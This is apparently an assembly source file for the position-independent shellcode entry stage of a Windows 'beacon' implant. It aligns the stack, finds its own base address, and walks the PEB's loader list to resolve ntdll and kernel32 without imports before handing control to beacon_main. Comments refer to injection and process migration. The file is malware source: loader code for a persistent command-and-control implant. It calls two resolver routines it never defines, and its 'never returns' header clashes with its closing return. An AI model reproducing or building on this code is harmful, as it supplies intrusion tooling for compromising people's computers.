.section .text
.globl _start

# ── PIC Bootstrap Entry Point ────────────────────────────────────────────────
# Called at offset 0 of the raw shellcode.
#
# 1. Calculates its own base address via RIP-relative addressing.
# 2. Aligns RSP to 16 bytes.
# 3. Passes control to beacon_main(argc=0, argv=NULL).
#
# Returns: never returns (beacon runs indefinitely).
# ──────────────────────────────────────────────────────────────────────────────

_start:
    # Preserve the original stack pointer
    movq    %rsp, %rbp

    # Align stack to 16 bytes (Windows x64 ABI requires 16-byte alignment
    # before CALL, meaning RSP must be 16-byte aligned at the CALL instruction)
    andq    $-16, %rsp

    # Save the PIC base address (RIP-relative to _start) in rbx for later use
    leaq    _start(%rip), %rbx

    # ── PEB Walker: Resolve ntdll base ──
    xorl    %ecx, %ecx
    call    peb_get_ntdll
    movq    %rax, %r12          # r12 = ntdll base

    # ── PEB Walker: Resolve kernel32 base ──
    call    peb_get_kernel32
    movq    %rax, %r13          # r13 = kernel32 base

    # ── CRT Initialization SKIPPED ──
    # MinGW's __main() calls __do_global_ctors() which iterates .ctors section.
    # In raw shellcode (inject/migrate), .ctors section is NOT mapped in memory,
    # so __main() crashes (reads invalid memory). The beacon has no global/static
    # C++ objects with constructors (all inline functions + stack locals), so
    # CRT initialization is unnecessary. __main is therefore skipped entirely.

    # ── Call C++ beacon_main ──
    # beacon_main(argc=0, argv=NULL)
    # On Windows x64 ABI: RCX = argc, RDX = argv
    leaq    -32(%rsp), %rsp     # shadow space (Windows ABI)
    xorl    %ecx, %ecx          # RCX = 0 (argc)
    xorl    %edx, %edx          # RDX = 0 (argv)
    call    beacon_main

    # Restore stack and return
    movq    %rbp, %rsp
    xorl    %eax, %eax
    ret

# ── PEB GetModuleByIndex ─────────────────────────────────────────────────────
# Returns the base address of the nth module in InMemoryOrderModuleList.
#   RCX = index (0=exe, 1=ntdll, 2=kernel32, ...)
# Returns: RAX = DllBase or NULL
peb_get_module_by_index:
    pushq   %rbx
    pushq   %rsi

    movq    %gs:0x60, %rax      # rax = PEB
    movq    0x18(%rax), %rax    # rax = PEB->Ldr
    movq    0x10(%rax), %rsi    # rsi = Ldr->InMemoryOrderModuleList.Flink

    xorl    %r8d, %r8d          # r8 = current index
.Lwalk:
    cmpq    %rcx, %r8           # found target index?
    je      .Lfound
    movq    (%rsi), %rsi         # rsi = Flink->Flink (next module)
    incq    %r8
    jmp     .Lwalk

.Lfound:
    # LDR_DATA_TABLE_ENTRY starts 0x10 bytes before InMemoryOrderLinks
    leaq    -0x10(%rsi), %rbx
    movq    0x30(%rbx), %rax    # rax = DllBase
    popq    %rsi
    popq    %rbx
    ret
